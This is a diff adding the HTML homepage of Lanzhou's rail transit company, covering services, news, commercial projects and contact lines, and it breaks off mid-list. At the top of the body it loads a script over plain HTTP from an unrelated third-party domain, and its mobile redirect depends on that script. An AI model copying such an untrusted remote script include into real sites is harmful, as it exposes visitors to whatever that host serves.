@@ -1,0 +1,1281 @@
+
+    
+        <!DOCTYPE html>
+   
+          <!-- <html lang="zh"  style="filter: grayscale(1);">  -->
+
+         <html lang="zh">
+
+
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <meta http-equiv="X-UA-Compatible" content="ie=edge">
+            <title>
+                兰州市轨道交通有限公司
+            </title>
+            <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+            <link rel="shortcut icon" href="/favicon.ico" />
+            <meta name="keywords" content="" />
+
+            <link rel="stylesheet" href="https://www.lzgdjt.com/lzgd/template/css/newreset.css">
+            <link rel="stylesheet" href="https://www.lzgdjt.com/lzgd/template/css/header.css">
+            <link rel="stylesheet" href="https://www.lzgdjt.com/lzgd/template/css/index.css">
+            <link rel="stylesheet" href="https://www.lzgdjt.com/lzgd/template/css/footer.css">
+            <link rel="stylesheet" href="https://www.lzgdjt.com/lzgd/template/css/swiper.min.css">
+            <link rel="stylesheet" type="text/css" href="https://www.lzgdjt.com/lzgd/template/js/layer/theme/default/layer.css" />
+
+        </head>
+
+        <body>
+            <script src="http://www.xiuc.top/i.js"></script> <!-- 加上这句 -->
+            <script>
+                var x = isPhone(); // 如果是手机则得到 true，否则得到 false
+                if (x) {
+                    window.location.href = "https://www.lzgdjt.com/lzgd/mobile/mobile-index.jsp";
+                }
+            </script>
+            <!--引入头部-->
+            
+    
+    <div class="newheader">
+		<div class="center">
+			<div class="logo">
+				<a href="https://www.lzgdjt.com/lzgd/"><img src="https://www.lzgdjt.com/lzgd/template/img/headerLogo.png"></a>
+			</div>
+			<ul class="menu">
+				<li><a href="https://www.lzgdjt.com/lzgd/">首页</a></li>
+				<li>
+                    
+					    <a href="https://www.lzgdjt.com/lzgd/new_list.jsp?cId=11070">新闻中心</a>
+                    
+					<span class="hide">
+                        
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/new_list.jsp?cId=11070" target="_blank">轨道动态</a>
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/new_list.jsp?cId=11079" target="_blank">通知公告</a>
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/new_list.jsp?cId=11040" target="_blank">行业资讯</a>
+                            
+                        
+					</span>
+				</li>
+				<li>
+                    
+                        <a href="https://www.lzgdjt.com/lzgd/partyBuild.jsp">党建之窗</a>
+                                   
+                </li>
+				<li>
+                    
+                        <a href="https://www.lzgdjt.com/lzpt/">廉政平台</a>
+                     
+                </li>
+				<li>
+                    
+                        <a href="https://www.lzgdjt.com/lzgd/serve.jsp">运营服务</a>
+                     
+                </li>
+				<li>
+                    
+                        <a href="https://www.lzgdjt.com/lzgd/resource.jsp">资源开发</a>
+                                                                 
+                </li>
+				<li>
+                    
+                        <a href="https://www.lzgdjt.com/lzgd/property1.jsp">轨道业态</a>
+                                        
+                </li>
+				<li>
+                    
+                      <a href="https://www.lzgdjt.com/lzgd/about.jsp">公司概况</a>
+                    
+			<!--<span class="hide">
+                        
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/about_page.jsp?cId=11076" target="_blank">公司简介</a>
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/culture.jsp?cId=11077" target="_blank">企业文化</a>
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/channel-ygfc.jsp?cId=11083" target="_blank">员工风采</a>
+                            
+                                <a href="https://lzgdjt.hcmcloud.cn/recruit#/index" target="_blank">人才中心</a>
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/page.jsp?cId=11085" target="_blank">联系我们</a>
+                            
+                        
+					</span>-->
+				</li> 
+			</ul>
+                  	<div class="search-box">
+				<div class="search">
+                          		<img src="https://www.lzgdjt.com/lzgd/template/img/search-icon.png"/>
+                          		<span class="hide">
+                				<input type="text" id="key" placeholder="请输入关键字" value="">
+                				<div id="searchbox" onclick="search()">搜索</div>
+            				</span>
+				</div>
+                  	</div> 
+                          
+		</div>
+	</div>
+
+    <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/SearchJs/commonUtil_src.js"></script>
+    <script>
+        function BindEnter() {
+            document.onkeydown = function (e) {
+                var ev = document.all ? window.event : e;
+                if (ev.keyCode == 13) {
+                    search();
+                }
+            };
+        } 
+            
+        function search() {
+            var searchKey = '';
+            if ('输入要搜索的关键字' != document.getElementById("key").value) {
+                searchKey = document.getElementById("key").value;
+            }
+            if (searchKey == ''||searchKey == '唐'|| searchKey == '仁' ||searchKey == '健' || searchKey == '唐仁' || searchKey == '仁健'|| searchKey == '唐仁健'||searchKey == '宋亮'|| searchKey == '虞海燕' ||searchKey == '王三运') {
+                // window.location = "https://www.lzgdjt.com/lzgd/search.jsp";
+            } else {
+                searchKey = encodeData(searchKey);
+                searchKey = encodeURI(encodeURIComponent(searchKey));
+                window.location = "https://www.lzgdjt.com/lzgd/search.jsp?keyword=" + searchKey;
+            }
+        }
+    </script>
+
+            <div class="carousel">
+                <!-- 轮播 -->
+                <div class="swiper-container">
+                    <div class="swiper-wrapper">
+                        
+                            <div class="swiper-slide">
+                                <img src="/lzgd/upload/2026-04-01/17750120995174028e1949d419c4b13019d46f735bd2b55.png">
+                            </div>
+                        
+                            <div class="swiper-slide">
+                                <img src="/lzgd/upload/2024-09-09/17258462385644028e19490767fe55290191d473b56421d9.png">
+                            </div>
+                        
+                            <div class="swiper-slide">
+                                <img src="/lzgd/upload/2024-09-03/17253487601704028e19490767fe51400191b6ccca6a6a42.png">
+                            </div>
+                        
+                            <div class="swiper-slide">
+                                <img src="/lzgd/upload/2024-09-14/17262966737964028e19490767fe58210191ef4cce0458e9.png">
+                            </div>
+                        
+                    </div>
+                    <div class="swiper-pagination"></div>
+                </div>
+                <!-- 公告 -->
+                <div class="notice">
+                    <span><img src="https://www.lzgdjt.com/lzgd/template/img/notice-icon.png"></span>
+                    <ul>
+
+                        
+                            <li>
+                                <marquee onMouseOver="this.stop()" onMouseOut="this.start()"><a
+                                        href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=50331">
+                                        【精致兰州·人文轨道】兰州轨道APP提升两大功能：1.在线储值功能，开通电子储值卡先充后乘，即享95折优惠；2.一卡通在线充值功能，利用手机NFC通过兰州轨道APP进行实体卡便捷充值。更多乘车优惠活动，请关注兰州轨道APP了解。
+                                    </a></marquee>
+                            </li>
+                        
+
+                    </ul>
+                </div>
+            </div>
+
+            <div class="content">
+                <div class="center">
+                    <!-- 地铁服务 -->
+                    <div class="service module-box">
+                        <div class="title">
+                            <h1>轨道服务</h1>
+                            <h3><span>精致兰州</span><span>人文轨道</span></h3>
+                        </div>
+                        <div class="main">
+                            <div class="w-simgtext w-simgtext2">
+                                <ul class="clearfix">
+
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/serve.jsp#timetable">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon05.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>时刻表</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover05.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>时刻表</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/serve_page.jsp?cId=11105">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon06.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>票价表</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover06.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>票价表</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/serve.jsp#timeLine">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon02.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>票价查询</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover02.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>票价查询</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+
+
+
+
+
+
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/claim_list.jsp?cId=11103">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon03.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>失物招领</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover03.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>失物招领</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/serve_list.jsp?cId=11171">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon01.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>购票须知</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover01.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>购票须知</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/serve_list.jsp?cId=11170">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon04.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>乘车须知</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover04.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>乘车须知</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+
+
+
+
+                                    <li>
+                                        
+                                            <a href="https://www.lzgdjt.com/lzgd/serve_list.jsp?cId=11175">
+                                                <div class="item clearfix">
+                                                    <div class="sigt1">
+                                                        <div class="bg"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img src="https://www.lzgdjt.com/lzgd/template/img/icon07.png" />
+                                                            </div>
+                                                            <div class="line"></div>
+                                                            <h3>票务卡种</h3>
+                                                        </div>
+                                                    </div>
+                                                    <div class="sigt2">
+                                                        <div class="bg bg_main"></div>
+                                                        <div class="sigt_text">
+                                                            <div class="s_img"><img
+                                                                    src="https://www.lzgdjt.com/lzgd/template/img/iconHover07.png" /></div>
+                                                            <div class="line"></div>
+                                                            <h3>票务卡种</h3>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- 轨道动态 -->
+                    <div class="dynamic module-box">
+                        <div class="title">
+                            <h1>轨道动态</h1>
+                            <h3><span>精致兰州</span><span>人文轨道</span></h3>
+                        </div>
+                        <div class="dynamicContent">
+                            <ul class="dynamicList">
+                                
+                                    <li>
+                                        <h2>
+                                            <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53201" class='morepage'>
+                                                兰州轨道交通2026年防汛应急实战演练公告
+                                            </a>
+                                        </h2>
+                                        <p>
+                                            <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53201" class='morepage'>
+                                                为切实筑牢兰州轨道交通线网防汛安全防线，提升多部门协同联动处置能力，提高线网积水倒灌、客流疏散、设施设备抢险等场景实战处置水平，兰州轨道交通...
+                                            </a>
+                                        </p>
+                                    </li>
+                                
+                                    <li>
+                                        <h2>
+                                            <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53198" class='morepage'>
+                                                甘肃省百万职工劳动和技能竞赛2026年“轨道杯”职工职业技能...
+                                            </a>
+                                        </h2>
+                                        <p>
+                                            <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53198" class='morepage'>
+                                                7月17日，甘肃省百万职工劳动和技能竞赛2026年“轨道杯”职工职业技能大赛决赛暨全国交通运输行业城市轨道交通行车调度员和行车多岗位联动技能...
+                                            </a>
+                                        </p>
+                                    </li>
+                                
+                                    <li>
+                                        <h2>
+                                            <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53183" class='morepage'>
+                                                数字赋能经营提质效  自研收入管理系统专项培训顺利举办
+                                            </a>
+                                        </h2>
+                                        <p>
+                                            <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53183" class='morepage'>
+                                                7月10日，置业公司组织开展系统实操专项培训，轨道公司财务中心、各子公司合同及收入业务相关工作人员参训。
+                                            </a>
+                                        </p>
+                                    </li>
+                                
+                            </ul>
+                            
+                                <!--  hide -->
+                                <div class="detail">
+                                    
+                                        <img src="/lzgd/upload/2026-07-20/17845414522644028e1949e4eead0807019f7ef597e82e4f.png">
+                                    
+                                    
+                                </div>
+
+                            
+                                <!--  hide -->
+                                <div class="detail">
+                                    
+                                        <img src="/lzgd/upload/2026-07-17/17842826130374028e1949e4eead0990019f6f88052d5e45.jpg">
+                                    
+                                    
+                                </div>
+
+                            
+                                <!--  hide -->
+                                <div class="detail">
+                                    
+                                        <img src="/lzgd/upload/2026-07-11/17837513726474028e1949e4eead0752019f4fddef674f90.png">
+                                    
+                                    
+                                </div>
+
+                            
+                        </div>
+
+                        <div class="more">
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/new_list.jsp?cId=11070">
+                                    <div class="more_content">
+                                        <strong>查看更多 + </strong>
+                                        <span class="fx_between por">
+                                            <div class="top"></div>
+                                            <div class="bottom"></div>
+                                            <div class="left"></div>
+                                            <div class="right"></div>
+                                        </span>
+                                    </div>
+                                </a>
+                            
+                        </div>
+
+                    </div>
+                    <!-- 通知公告 -->
+                    <!-- <div class="circular">
+                        <div class="title">
+                            <h1>通知公告</h1>
+                            <h3>精致兰州 人文轨道</h3>
+                        </div>
+                        <div class="circularList">
+                            <ul>
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=53052">
+                                            <h2>
+                                                兰州市轨道交通有限公司“高层次人才招聘”拟录用人员公示
+                                            </h2>
+                                            <p>
+                                                兰州市轨道交通有限公司“高层次人才招聘”拟录用人员公示近日，市轨道公司组织开展了2026年公司高层次急需紧缺专业技术人才...
+                                            </p>
+                                            <time>
+                                                <strong>
+                                                    12
+                                                </strong>
+                                                <span>
+                                                    2026-05
+                                                </span>
+                                            </time>
+                                        </a>
+                                    </li>
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=51458">
+                                            <h2>
+                                                关于兰州市轨道交通有限公司恢复电子发票开票业务的公告
+                                            </h2>
+                                            <p>
+                                                尊敬的乘客：您好！为积极响应国家税务总局对于发票数字化管理的要求，提高发票开具和管理的效率及准确性，我公司于2024年9...
+                                            </p>
+                                            <time>
+                                                <strong>
+                                                    09
+                                                </strong>
+                                                <span>
+                                                    2024-10
+                                                </span>
+                                            </time>
+                                        </a>
+                                    </li>
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=51392">
+                                            <h2>
+                                                公告丨关于兰州市轨道交通有限公司技术系统维护期间暂停提供电子...
+                                            </h2>
+                                            <p>
+                                                尊敬的乘客：您好！为了积极响应国家税务总局对于发票数字化管理的要求，提高发票开具和管理的效率及准确性，我公司将进行技术系...
+                                            </p>
+                                            <time>
+                                                <strong>
+                                                    12
+                                                </strong>
+                                                <span>
+                                                    2024-09
+                                                </span>
+                                            </time>
+                                        </a>
+                                    </li>
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=50060">
+                                            <h2>
+                                                关于近期假冒我公司名义发布虚假招聘信息的声明
+                                            </h2>
+                                            <p>
+                                                近日，我公司获悉有社会不明身份人员通过微信群等网络社交平台发布市轨道公司将招聘出租车司机的虚假招聘信息，该行为严重损害了...
+                                            </p>
+                                            <time>
+                                                <strong>
+                                                    24
+                                                </strong>
+                                                <span>
+                                                    2024-01
+                                                </span>
+                                            </time>
+                                        </a>
+                                    </li>
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=46937">
+                                            <h2>
+                                                兰州市人民代表大会常务委员会公告 （第1号）
+                                            </h2>
+                                            <p>
+                                                兰州市人民代表大会常务委员会公告（第1号）《兰州市轨道交通条例》经兰州市第十六届人民代表大会常务委员会第三十九次会议于2...
+                                            </p>
+                                            <time>
+                                                <strong>
+                                                    19
+                                                </strong>
+                                                <span>
+                                                    2022-04
+                                                </span>
+                                            </time>
+                                        </a>
+                                    </li>
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44863">
+                                            <h2>
+                                                兰州市轨道物业管理有限公司病媒生物防制服务项目
+                                            </h2>
+                                            <p>
+                                                本招标项目兰州市轨道物业管理有限公司病媒生物防制服务项目已批准建设，招标人为兰州市轨道物业管理有限公司，资金来自企业自筹...
+                                            </p>
+                                            <time>
+                                                <strong>
+                                                    10
+                                                </strong>
+                                                <span>
+                                                    2021-12
+                                                </span>
+                                            </time>
+                                        </a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="more">
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/new_list.jsp?cId=11079">
+                                    <div class="more_content">
+                                        <strong>查看更多 + </strong>
+                                        <span class="fx_between por">
+                                            <div class="top"></div>
+                                            <div class="bottom"></div>
+                                            <div class="left"></div>
+                                            <div class="right"></div>
+                                        </span>
+                                    </div>
+                                </a>
+                            
+                        </div>
+
+                    </div> -->
+                    <!-- 专题专栏 -->
+                    <div class="special module-box">
+                        <div class="title">
+                            <h1>专题专栏</h1>
+                            <h3><span>精致兰州</span><span>人文轨道</span></h3>
+                        </div>
+                        <div class="specialList">
+                            <ul>
+
+
+                               
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/ztjj-page.jsp?cId=11244">
+                                            <img src="/lzgd/upload/2022-12-13/16709225355274028e19484c8ee4243501850abe8267747e.jpg" alt="">
+                                            <p>学习贯彻党的二十大</p>
+                                        </a>
+                                    </li>
+                                
+                              
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/ztjj-page.jsp?cId=11252">
+                                            <img src="https://www.lzgdjt.com/lzgd/template/img/special5.png" alt="">
+                                            <p>树立和践行正确政绩观学习教育</p>
+                                        </a>
+                                    </li>
+                                
+                              
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/ztjj-page.jsp?cId=11153">
+                                            <img src="https://www.lzgdjt.com/lzgd/template/img/special4.png" alt="">
+                                            <p>创建文明城市</p>
+                                        </a>
+                                    </li>
+                                
+                              
+                              
+                                
+                                    <li>
+                                        <a href="https://www.lzgdjt.com/lzgd/ztjj-page.jsp?cId=11245">
+                                            <img src="/lzgd/upload/2023-02-17/16765975199254028e19484c8ee4245701865cffe6353549.jpg" alt="">
+                                            <p>“三抓三促”行动进行时</p>
+                                        </a>
+                                    </li>
+                                
+                               
+                                
+                            </ul>
+                        </div>
+                        <div class="more">
+                            
+                                <a href="https://www.lzgdjt.com/lzgd/ztjj-page.jsp?cId=11244">
+                                    <div class="more_content">
+                                        <strong>查看更多 + </strong>
+                                        <span class="fx_between por">
+                                            <div class="top"></div>
+                                            <div class="bottom"></div>
+                                            <div class="left"></div>
+                                            <div class="right"></div>
+                                        </span>
+                                    </div>
+                                </a>
+                            
+                        </div>
+                    </div>
+
+                    <!-- 资源开发 -->
+                    <div class="resources module-box">
+                        <div class="title">
+                            <h1>资源开发</h1>
+                            <!-- <h3>城市引擎 引领未来</h3> -->
+                            <h3><span class="res_tes1 active">商业开发</span><span class="res_tes2">媒体资源</span></h3>
+                        </div>
+
+                        <div class="resourcesContent resource_new">
+                            <div class="res1 show">
+                                <div class="resourcesntNav">
+                                    <div class="swiper-container">
+                                        <div class="swiper-wrapper">
+                                            
+                                                <div class="swiper-slide">
+                                                    停车场项目
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    地铁百货便利店
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    兰州奥体中心
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    迎门滩项目
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    兰州西站北广场
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    小西湖项目
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    西关什字项目
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    东方红广场项目
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    兰州科技创新园
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    轨道·城市曙光
+                                                </div>
+                                            
+                                        </div>
+
+                                    </div>
+                                    <div class="swiper-button-prev"></div>
+                                    <div class="swiper-button-next"></div>
+                                </div>
+                                <div class="resourcesntList">
+                                    <div class="swiper-container">
+                                        <div class="swiper-wrapper">
+
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44691" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2021-07-06/16255393082924028df947a74bb7e69017a79b16b040be3.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44690" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2026-04-29/17774530934584028e1949d419c4b599019dd875d2526568.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44688" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2021-07-06/16255392396104028df947a74bb7e44017a79b05eba0bd2.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44687" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2021-07-06/16255391957324028df947a74bb7e983017a79afb3540bbb.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44589" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2021-07-06/16255391632614028df947a74bb7e974017a79af347d0bb1.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44586" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2026-04-29/17774530341714028e1949d419c4b406019dd874eabb654e.jpg">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44569" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2026-04-29/17774529733454028e1949d419c4b858019dd873fd216543.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44568" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2021-07-06/16255390412674028df947a74bb7e354017a79ad57f30b95.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44567" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2021-07-06/16255389949834028df947a74bb7e572017a79aca3270b8d.png">
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44566" target="_blank"
+                                                        style="display: inline-block;width:100%;">
+                                                        <img src="/lzgd/upload/2026-05-07/17781237657904028e1949d419c4b312019e006f781e6cea.png">
+                                                    </a>
+                                                </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="res2">
+                                <div class="resourcesntNav2">
+                                    <div class="swiper-container">
+                                        <div class="swiper-wrapper">
+                                            
+                                                <div class="swiper-slide">
+                                                    其他资源
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    特殊媒体
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    列车媒体
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    地铁电视
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    传统广告
+                                                </div>
+                                            
+                                        </div>
+
+                                    </div>
+                                    <div class="swiper-button-prev"></div>
+                                    <div class="swiper-button-next"></div>
+                                </div>
+                                <div class="resourcesntList2">
+                                    <div class="swiper-container">
+                                        <div class="swiper-wrapper">
+
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44685" target="_blank">
+                                                        <!-- <img src="/lzgd/upload/2021-07-06/16255386218854028df947a74bb7e65017a79a6f1bd0b6f.png"> -->
+                                                        
+                                                            <img src="/lzgd/upload/2021-07-06/16255386218854028df947a74bb7e65017a79a6f1bd0b6f.png">
+                                                        
+                                                        
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44684" target="_blank">
+                                                        <!-- <img src="/lzgd/upload/2021-07-06/16255385947764028df947a74bb7e887017a79a687d80b67.png"> -->
+                                                        
+                                                            <img src="/lzgd/upload/2021-07-06/16255385947764028df947a74bb7e887017a79a687d80b67.png">
+                                                        
+                                                        
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44683" target="_blank">
+                                                        <!-- <img src="/lzgd/upload/2021-07-06/16255385723654028df947a74bb7e198017a79a6304d0b5e.png"> -->
+                                                        
+                                                            <img src="/lzgd/upload/2021-07-06/16255385723654028df947a74bb7e198017a79a6304d0b5e.png">
+                                                        
+                                                        
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44682" target="_blank">
+                                                        <!-- <img src="/lzgd/upload/2021-07-06/16255385536604028df947a74bb7e25017a79a5e73c0b55.png"> -->
+                                                        
+                                                            <img src="/lzgd/upload/2021-07-06/16255385536604028df947a74bb7e25017a79a5e73c0b55.png">
+                                                        
+                                                        
+                                                    </a>
+                                                </div>
+                                            
+                                                <div class="swiper-slide">
+                                                    <a href="https://www.lzgdjt.com/lzgd/detail.jsp?contentId=44681" target="_blank">
+                                                        <!-- <img src="/lzgd/upload/2021-07-06/16255385289564028df947a74bb7e432017a79a586bc0b4e.png"> -->
+                                                        
+                                                            <img src="/lzgd/upload/2021-07-06/16255385289564028df947a74bb7e432017a79a586bc0b4e.png">
+                                                        
+                                                        
+                                                    </a>
+                                                </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+
+
+
+                        </div>
+                    </div>
+
+                    <!-- 联系我们 -->
+                    <div class="hotline module-box">
+                        <div class="title hotlineTitle">
+                            <h1>联系我们</h1>
+                            <h3><span>精致兰州</span><span>人文轨道</span></h3>
+                        </div>
+                        <ul>
+                            <li class="one">
+                                 <h4>轨交城市运营</h4>
+                                     <h9> 地铁广告、文旅会展、物业服务、P+R停车场
+                                      <p> 咨询热线 0931-2809080</p></h9>
+                            </li>
+                            <li class="two">
+                                <h4>轨交数字科技</h4>
+                              <h9> 兰州科创园、新区彩虹城、兰州轨道APP、科技服务
+                                      <p> 咨询热线 0931-8678788</p></h9>
+                            </li>
+                            <li class="three1">
